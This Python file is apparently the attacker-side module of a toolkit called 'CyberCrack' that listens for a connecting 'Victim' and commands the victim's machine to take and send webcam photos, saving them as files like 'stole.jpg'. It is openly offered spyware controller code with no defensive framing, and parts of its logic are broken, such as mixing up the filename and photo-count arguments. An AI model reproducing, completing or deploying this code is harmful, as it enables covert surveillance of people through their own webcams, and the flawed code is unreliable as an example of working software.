import socket
import time


def sessionhelp():
    print(r"""
: webcam_snap filename number_of_photos     take pictures from the target computer and save it in your computer. 
                                            eg:- webcam_snap stole.jpg 5. that command will take five pictures from 
                                            target, and store them in 1_stole, 2_stole, 3_stole, 4_stole, 5_stole
    """)


def modulehelp():
    print(r"""
: set LHOST           Your ip
: set LPORT           the port to listen on
: run or exploit      run the script
    """)


def webcam(lhost, lport):
    try:
        print("[+] Socket object created")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((lhost, lport))
        print("[+] Socket is ready to accept connections")
        server.listen(0)
        client, add = server.accept()
        print("[+] Victim connected")
        while True:
            user_in = input("\nWebcam > ")
            i = 1
            try:
                if user_in.split()[0] == "webcam_snap":
                    name = user_in.split()[2]
                    client.send(name.encode())
                    if isinstance(int(user_in.split()[2]), int):
                        for i in range(1, int(name) + 1):
                            data = client.recv(1048576)
                            with open(str(i) + "_" + user_in.split()[1] + ".png", "wb") as write:
                                write.write(data)
                                print("Done")
                                i += 1
                    else:
                        print("The input must be a number")
                elif user_in == "help" or user_in == "show options":
                    sessionhelp()
                elif user_in == "exit":
                    break
                else:
                    print("Incorrect command")
            except KeyboardInterrupt:
                break
            except IndexError:
                print("Complete the command")
    except socket.gaierror:
        print("Invalid address, port")


def console():
    while True:
        try:
            user_in = input("CyberCrack: spy/webcam/snap > ")
            if user_in == "help" or user_in == "show options":
                modulehelp()
            elif user_in.startswith("set") and user_in.split()[1] == "LHOST":
                lhost = user_in.split()[2]
                print("LHOST = " + str(lhost))
            elif user_in.startswith("set") and user_in.split()[1] == "LPORT":
                lport = user_in.split()[2]
                print("LPORT = " + str(lport))
            elif user_in == "run" or user_in == "exploit":
                webcam(lhost=lhost, lport=lport)
            else:
                print("Invalid command")
        except NameError:
            print("Assign all values related to this exploit")
        except KeyboardInterrupt:
            break
